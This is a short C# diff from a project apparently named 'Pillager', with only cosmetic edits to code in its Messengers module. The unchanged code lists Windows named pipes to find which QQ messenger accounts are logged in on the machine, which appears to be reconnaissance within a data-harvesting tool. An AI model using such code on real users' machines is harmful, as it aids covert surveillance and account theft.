@@ -1,8 +1,8 @@
-﻿using Pillager.Helper;
-using System;
+﻿using System;
 using System.Collections.Generic;
 using System.IO;
 using System.Text;
+using Pillager.Helper;
 
 namespace Pillager.Messengers
 {
@@ -47,7 +47,7 @@ namespace Pillager.Messengers
             }
             foreach (var qq in Directory.GetFiles(@"\\.\Pipe\"))
             {
-                if (qq.Contains(@"\\.\Pipe\QQ_") && qq.Contains(@"_pipe")) online.Add(qq.Replace(@"\\.\Pipe\QQ_", "").Replace("_pipe", ""));
+                if (qq.Contains(@"\\.\Pipe\QQ_") && qq.Contains("_pipe")) online.Add(qq.Replace(@"\\.\Pipe\QQ_", "").Replace("_pipe", ""));
             }
             StringBuilder sb = new StringBuilder();
             if (all.Count > 0)
